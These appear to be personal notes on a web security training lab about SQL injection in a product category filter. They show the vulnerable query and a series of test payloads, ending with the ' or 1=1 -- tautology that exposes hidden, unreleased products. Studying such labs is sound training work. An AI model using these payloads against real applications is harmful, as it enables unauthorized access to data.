Lab - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

SQL injection - product category filter

Vulnerable query - SELECT * FROM products WHERE category = 'Gifts' AND released = 1 

Goal: display all products both released and unreleased.

Testing different scenarios and payloads:
	SELECT * FROM products WHERE category = 'Pets' AND released = 1          
	\  
	SELECT * FROM products WHERE category = ''' AND released = 1
	\ 
	SELECT * FROM products WHERE category = ''--' AND released = 1 
	\ 
	SELECT * FROM products WHERE category = ''
	\ 
	SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 
